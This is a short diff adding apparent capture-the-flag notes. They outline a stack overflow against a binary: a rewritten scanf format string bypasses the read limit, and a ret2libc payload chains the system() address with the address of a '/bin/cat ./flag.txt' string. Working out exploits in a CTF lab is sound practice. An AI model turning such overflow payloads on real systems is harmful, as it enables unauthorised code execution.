@@ -1,0 +1,14 @@
+1)
+rewriting format argument of scanf(bypassing read limit)
+AAAAAAAAAAAAAAAAAAAA%99s
+
+2) controlling 49th byte
+
+3) 0x80486f0 - address of "/bin/cat ./flag.txt" in the binary
+
+4) system function address = 0xf7e35b40
+
+5) injection: 
+	"A"*49 + p32(0xf7e35b40) + p32(0xf7e297f0) + p32(0x80486f0)
+
+6) have to find right address of libc on the server(((((
